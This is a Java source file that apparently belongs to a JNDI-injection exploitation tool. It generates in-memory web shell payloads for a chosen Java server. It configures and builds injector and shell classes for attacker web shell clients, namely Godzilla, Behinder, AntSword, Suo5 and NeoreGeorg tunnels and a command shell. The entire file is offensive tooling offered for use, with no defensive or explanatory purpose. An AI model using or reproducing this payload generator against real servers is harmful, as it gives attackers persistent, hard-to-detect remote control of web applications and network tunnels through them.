package map.jndi.payload;

import com.reajason.javaweb.memshell.MemShellGenerator;
import com.reajason.javaweb.memshell.MemShellResult;
import com.reajason.javaweb.memshell.ShellTool;
import com.reajason.javaweb.memshell.config.*;

public class MemShellPayload {
    public static MemShellResult generate(String server, String tool, String type) {
        ShellConfig shellConfig = ShellConfig.builder()
                .server(server)
                .shellTool(tool)
                .shellType(type)
                .shrink(true)
                .debug(false)
                .build();
        InjectorConfig injectorConfig = InjectorConfig.builder().build();
        ShellToolConfig shellToolConfig = getShellToolConfig(shellConfig.getShellTool());

        return MemShellGenerator.generate(shellConfig, injectorConfig, shellToolConfig);
    }
    public static void printInfo(MemShellResult result) {
        System.out.println();
        System.out.println("Injector ClassName: " + result.getInjectorClassName());
        System.out.println("Shell ClassName: " + result.getShellClassName());
        System.out.println(result.getShellConfig());
        System.out.println(result.getShellToolConfig());
        System.out.println();
    }

    public static ShellToolConfig getShellToolConfig(String shellTool) {
        switch (shellTool) {
            case ShellTool.Godzilla:
                return GodzillaConfig.builder().build();
            case ShellTool.Behinder:
                return BehinderConfig.builder().build();
            case ShellTool.AntSword:
                return AntSwordConfig.builder().build();
            case ShellTool.Command:
                return CommandConfig.builder().build();
            case ShellTool.Suo5:
                return Suo5Config.builder().build();
            case ShellTool.NeoreGeorg:
                return NeoreGeorgConfig.builder().build();
            default:
                throw new UnsupportedOperationException("Unknown Shell Tool");
        }
    }
}
